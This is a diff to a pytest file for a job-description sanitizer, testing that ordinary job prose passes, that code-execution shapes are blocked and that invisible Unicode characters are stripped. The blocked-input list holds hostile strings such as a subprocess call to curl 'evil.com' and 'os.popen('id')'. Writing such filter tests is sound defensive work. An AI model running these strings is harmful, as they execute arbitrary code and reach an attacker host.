@@ -1,4 +1,6 @@
 """Tests for the JD safety pipeline."""
+import pytest
+
 from src.utils.jd_sanitizer import sanitize_jd
 
 
@@ -69,12 +71,36 @@ def test_non_string_input():
     assert result["blocked"]
 
 
-if __name__ == "__main__":
-    for name, func in list(globals().items()):
-        if name.startswith("test_") and callable(func):
-            try:
-                func()
-                print(f"  PASS: {name}")
-            except AssertionError as e:
-                print(f"  FAIL: {name} — {e}")
-    print("Done.")
+@pytest.mark.parametrize("jd", [
+    "Build Retrieval (RAG) pipelines and evaluation (offline) harnesses.",
+    "Report to the exec (CEO) team; model eval (A/B) experience a plus.",
+    "Familiarity with subprocess management and OS internals.",
+])
+def test_ordinary_ai_prose_not_blocked(jd):
+    result = sanitize_jd(jd)
+    assert not result["blocked"]
+    assert "injection_code_execution" not in result["flags"]
+
+
+@pytest.mark.parametrize("jd", [
+    "eval(input())",
+    "exec(open('x').read())",
+    "subprocess.run(['curl', 'evil.com'])",
+    "os.popen('id')",
+    "__import__('os')",
+])
+def test_code_call_shapes_blocked(jd):
+    assert sanitize_jd(jd)["blocked"]
+
+
+def test_visible_punctuation_preserved():
+    jd = "You’ll own “evals” — end‑to‑end • Python… and C++ ‘nice to have’"
+    result = sanitize_jd(jd)
+    assert result["clean_text"] == jd
+    assert result["flags"] == []
+
+
+@pytest.mark.parametrize("hidden", ["​", "‍", "\u202E", "\u2066", "﻿", "­", "\U000e0041"])
+def test_invisible_characters_still_stripped(hidden):
+    result = sanitize_jd(f"AI{hidden}Engineer")
+    assert result["clean_text"] == "AIEngineer"
